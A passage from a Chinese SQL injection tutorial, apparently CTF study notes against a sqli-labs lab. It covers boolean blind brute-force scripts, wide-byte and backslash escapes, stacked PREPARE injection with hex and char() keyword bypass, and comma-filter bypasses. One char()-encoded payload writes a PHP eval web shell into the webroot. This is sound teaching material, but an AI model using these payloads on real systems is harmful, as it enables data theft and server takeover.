    /?id=' or database() like 's_______' --+
    /?id=' or (select database()) like 's_______' --+
如上图所示，回显正常，说明数据库名的第一个字符是s。
综上所述，很明显和普通的布尔盲注差不多，于是写个GET的二分法盲注脚本：
    import requests
    import string
    # strs = string.printable
    strs = string.ascii_letters + string.digits + '_'
    url = "http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id="
    payload = "' or (select database()) like '{}%'--+"
    if __name__ == "__main__":
        name = ''
        for i in range(1, 40):
            char = ''
            for j in strs:
                payloads = payload.format(name + j)
                urls = url + payloads
                r = requests.get(urls)
                if "You are in" in r.text:
                    name += j
                    print(j, end='')
                    char = j
                    break
            if char == '#':
                break
##### REGEXP 注入
REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。
  1. 判断数据库长度
    /?id=' or (length(database())) regexp 8 --+  // 回显正常
  1. 判断数据库名
    /?id=' or database() regexp '^s'--+    // 回显正常
    /?id=' or database() regexp 'se'--+    // 回显正常, 不适用^和$进行匹配也可以
    /?id=' or database() regexp '^sa'--+   // 报错
    /?id=' or database() regexp 'y$'--+    // 回显正常
脚本：
    import requests
    import string
    # strs = string.printable
    strs = string.ascii_letters + string.digits + '_'
    url = "http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id="
    payload = "' or (select database()) regexp '^{}'--+"
    if __name__ == "__main__":
        name = ''
        for i in range(1, 40):
            char = ''
            for j in strs:
                payloads = payload.format(name + j)
                urls = url + payloads
                r = requests.get(urls)
                if "You are in" in r.text:
                    name += j
                    print(j, end='')
                    char = j
                    break
            if char == '#':
                break
以上脚本都要注意是掌握编写思路，不是干抄脚本。
#### 过滤引号绕过
##### 宽字节注入
###### 前置知识
**magic_quotes_gpc** （魔术引号开关）
`magic_quotes_gpc`函数在php中的作用是判断解析用户提交的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。
单引号（’）、双引号（”）、反斜线（\）等字符都会被加上反斜线，我们输入的东西如果不能闭合，那我们的输入就不会当作代码执行，就无法产生SQL注入。
**addslashes()函数**
返回在预定义字符之前添加反斜杠的字符串
> 预定义字符：单引号（'），双引号（"），反斜杠（\），NULL
###### 宽字节概念：
  1. 单字节字符集：所有的字符都使用一个字节来表示，比如 ASCII 编码(0-127)
  2. 多字节字符集：在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。
  3. UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。
  4. 常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 不存在宽字节注入，可以收集存在宽字节注入的编码。
  5. 宽字节注入时利用mysql的一个特性，使用GBK编码的时候，会认为两个字符是一个汉字
###### 成因与示例
前面讲到了GBK编码格式。GBK是双字符编码，那么为什么他们会和渗透测试发送了“巧遇”呢？
**宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码那么就有可能产生宽字节注入。**
例如说MySql的编码设置为了SET NAMES 'gbk'或是 SET character_set_client
=gbk，这样配置会引发编码转换从而导致的注入漏洞。
**宽字节SQL注入的根本原因:**
**宽字节SQL注入就是PHP发送请求到MySql时使用了语句**
**SET NAMES 'gbk' 或是SET character_set_client =gbk
进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节注入。**
**magic_quotes_gpc的作用：当PHP的传参中有特殊字符就会在前面加转义字符'\',来做一定的过滤**
为了绕过magic_quotes_gpc的\,于是乎我们开始导入宽字节的概念
我们发现\的编码是%5c，然后我们会想到传参一个字符想办法凑成一个gbk字符,例如：‘运’字是%df%5c
    SELECT * FROM users WHERE id='1\'' LIMIT 0,1
这条语句因为\使我们无法去注入，那么我们是不是可以用%df吃到%5c,因为如果用GBK编码的话这个就是运，然后成功绕过
    SELECT * FROM users WHERE id='1\'#' LIMIT 0,1
###### 虽然是写在了过滤引号的位置但是其实不止适用于过滤引号
##### 使用反斜杠 \ 逃逸 Sql 语句
如果没有过滤反斜杠的话，我们可以使用反斜杠将后面的引号转义，从而逃逸后面的 Sql 语句。
假设sql语句为：
    select username, password from users where username='$username' and password='$password';
假设输入的用户名是 `admin\`，密码输入的是 `or 1#` 整个SQL语句变成了
    select username,password from users where username='admin\' and password=' or 1#'
由于单引号被转义，`and password=`这部分都成了username的一部分，即
    username='admin\' and password='
这样 `or 1` 就逃逸出来了，由此可控，可作为注入点了。
#### 堆叠注入时利用 MySql 预处理
在遇到堆叠注入时，如果select、rename、alter和handler等语句都被过滤的话，我们可以用 **MySql预处理语句配合concat拼接**
来执行sql语句拿flag。
  1. PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字(`hello`)供之后调用
  2. EXECUTE：执行命令
  3. DEALLOCATE PREPARE：释放命令
  4. SET：用于设置变量(`@a`)
    1';sEt @a=concat("sel","ect flag from flag_here");PRepare hello from @a;execute hello;#
这里还用大小写简单绕了一下其他过滤
##### MySql 预处理配合十六进制绕过关键字
基本原理如下：
    mysql> select hex('show databases');
    +------------------------------+
    | hex('show databases;')       |
    +------------------------------+
    | 73686F7720646174616261736573 |
    +------------------------------+
    1 row in set (0.01 sec)
    mysql> set @b=0x73686F7720646174616261736573;
    Query OK, 0 rows affected (0.01 sec)
    mysql> prepare test from @b;
    Query OK, 0 rows affected (0.02 sec)
    Statement prepared
    mysql> execute test;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | challenges         |
    | mysql              |
    | performance_schema |
    | security           |
    | test               |
    +--------------------+
    6 rows in set (0.02 sec)
即payload类似如下：
    1';sEt @a=0x73686F7720646174616261736573;PRepare hello from @a;execute hello;#
##### MySql预处理配合字符串拼接绕过关键字
原理就是借助`char()`函数将ascii码转化为字符然后再使用`concat()`函数将字符连接起来，有了前面的基础这里应该很好理解了：
    set @sql=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(39),char(60),char(63),char(112),char(104),char(112),char(32),char(101),char(118),char(97),char(108),char(40),char(36),char(95),char(80),char(79),char(83),char(84),char(91),char(119),char(104),char(111),char(97),char(109),char(105),char(93),char(41),char(59),char(63),char(62),char(39),char(32),char(105),char(110),char(116),char(111),char(32),char(111),char(117),char(116),char(102),char(105),char(108),char(101),char(32),char(39),char(47),char(118),char(97),char(114),char(47),char(119),char(119),char(119),char(47),char(104),char(116),char(109),char(108),char(47),char(102),char(97),char(118),char(105),char(99),char(111),char(110),char(47),char(115),char(104),char(101),char(108),char(108),char(46),char(112),char(104),char(112),char(39),char(59));prepare s1 from @sql;execute s1;
也可以不用concat函数，直接用char函数也具有连接功能：
    set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,119,104,111,97,109,105,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare s1 from @sql;execute s1;
#### 过滤逗号绕过
当逗号被过滤了之后，我们便不能向下面这样正常的时候substr()函数和limit语句了：
    select substr((select database()),1,1);
    select * from users limit 0,1;
##### 使用from...for...绕过
我们可以使用 `from...for..` 语句替换 substr() 函数里的 `,1,1`：
    select substr((select database()) from 1 for 1);
    # 此时 from 1 for 1 中的两个1分别代替 substr() 函数里的两个1
    select substr((select database()) from 1 for 1);    # s
    select substr((select database()) from 2 for 1);    # e
    select substr((select database()) from 3 for 1);    # c
    select substr((select database()) from 4 for 1);    # u
    select substr((select database()) from 5 for 1);    # r
    select substr((select database()) from 6 for 1);    # i
    select substr((select database()) from 7 for 1);    # t
    select substr((select database()) from 8 for 1);    # y
    # 如果过滤了空格, 则可以使用括号来代替空格:
    select substr((select database())from(1)for(1));    # s
    select substr((select database())from(2)for(1));    # e
    select substr((select database())from(3)for(1));    # c
    select substr((select database())from(4)for(1));    # u
    select substr((select database())from(5)for(1));    # r
    select substr((select database())from(6)for(1));    # i
    select substr((select database())from(7)for(1));    # t
    select substr((select database())from(8)for(1));    # y
即，from用来指定从何处开始截取，for用来指定截取的长度，如果不加for的话则 `from 1` 就相当于从字符串的第一位一直截取到最后：
    select substr((select database()) from 1);    # security
    select substr((select database()) from 2);    # ecurity
    select substr((select database()) from 3);    # curity